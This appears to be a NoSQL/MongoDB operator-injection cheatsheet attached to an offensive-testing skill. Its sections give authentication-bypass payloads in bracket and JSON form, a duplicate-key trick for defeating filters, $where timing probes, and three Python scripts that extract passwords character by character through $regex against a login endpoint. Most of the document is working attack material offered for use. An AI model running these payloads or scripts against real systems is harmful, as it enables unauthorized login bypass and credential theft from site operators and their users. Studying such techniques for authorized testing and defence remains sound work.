# MongoDB / NoSQL operator-injection cheatsheet — Open WHEN: recon fingerprints a Mongo/NoSQL back end (Express+mongoose, `$`-operators echoed in errors, JSON login body) and the SKILL body's one-line operator probes need full auth-bypass + `$regex` extraction follow-through

The body already lists the seed probes (`username[$ne]=admin&password[$ne]=`,
`{"$where":"sleep(5000)"}`, `{"username":{"$in":["admin"]}}`). This file is the
full operator set, every auth-bypass shape, and the char-by-char `$regex`
extraction the body does not carry.

## Operator reference
| Operator | Meaning | Use |
|----------|---------|-----|
| `$ne`    | not equal | match any non-given value → tautology |
| `$gt`/`$lt` | greater/less than | range bypass, ordering oracle |
| `$nin`   | not in (array) | exclude known-bad guesses |
| `$regex` | regular expression | per-character extraction oracle |
| `$where` | server-side JS predicate | blind time/boolean via JS |
| `$in`    | value in array | username brute over a wordlist |

## Auth bypass — query-string (bracket) form
Express `qs`/`body-parser` turns `a[$ne]=b` into `{a:{$ne:"b"}}`. Send as
`application/x-www-form-urlencoded`:
```
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
```

## Auth bypass — JSON body
`Content-Type: application/json`:
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```
Pin a known account and brute the username with `$in`:
```json
{"username":{"$in":["Admin","4dm1n","admin","root","administrator"]},"password":{"$gt":""}}
```

## In-band `$regex` extraction (visible response oracle)
First learn the value length — the request only matches when `.{N}` equals it:
```
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```
Then walk the value character-by-character; a match flips the response:
```
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp
```
Anchored prefix form (urlencoded):  `password[$regex]=^m` → `^md` → `^mdp`.
JSON anchored form (pin the user with `$eq`):
```json
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```
Note `$regex` metachars in the charset (`* + . ? | ^ $ \`) must be skipped or
escaped during the walk or they corrupt the match.

## Duplicate-key WAF/pre-condition strip
Mongo keeps the LAST occurrence of a duplicate key. Re-send the filtered field
to override a server-side pre-condition (e.g. an `isAdmin:false` clause the app
appended):
```js
{"id":"10", "id":"100"}   // server sees id == "100"
```

## Blind extraction harness — JSON POST
Oracle = `'OK' in body` or HTTP 302. Walk `^prefix` until no char extends it:
```python
import requests, string
u, headers = "http://TARGET/login", {'content-type': 'application/json'}
username, password = "admin", ""
while True:
    for c in string.printable:
        if c in '*+.?|^$\\': continue
        p = '{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
        r = requests.post(u, data=p, headers=headers, allow_redirects=False)
        if 'OK' in r.text or r.status_code == 302:
            password += c; print("found:", password); break
    else:
        break
```

## Blind extraction harness — urlencoded POST
Oracle = 302 redirect to a known post-login path:
```python
import requests, string
u = "http://TARGET/login"
headers = {'content-type': 'application/x-www-form-urlencoded'}
username, password = "admin", ""
while True:
    for c in string.printable:
        if c in '*+.?|&$^\\': continue
        p = 'user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
        r = requests.post(u, data=p, headers=headers, allow_redirects=False)
        if r.status_code == 302 and r.headers.get('Location') == '/dashboard':
            password += c; print("found:", password); break
    else:
        break
```

## Blind extraction harness — GET
Oracle = a success marker string in the body (`'Yeah'`):
```python
import requests, string
u = "http://TARGET/login"
username, password = "admin", ""
while True:
    for c in string.printable:
        if c in '*+.?|#&$^\\': continue
        r = requests.get(f"{u}?username={username}&password[$regex]=^{password + c}")
        if 'Yeah' in r.text:
            password += c; print("found:", password); break
    else:
        break
```

## `$where` / JS-side blind (when `$where` is reachable)
Server-side JS predicate — boolean and time oracles without `$regex`:
```json
{"$where": "this.password.length == 3"}
{"$where": "this.password[0] == 'm'"}
{"$where": "sleep(5000)"}
```

## Deeper chains worth fetching when the basics confirm
- Aggregation-pipeline injection (`$lookup`/`$facet` smuggling) — Soroush Dalili,
  Jun 2024 (`soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines`).
- NoSQL error-based extraction (force Mongo to leak data in error text) —
  Reino Mostert / SensePost, Mar 2025.
- `nosqli`/`NoSQLMap` automate the operator + `$regex` walk above.
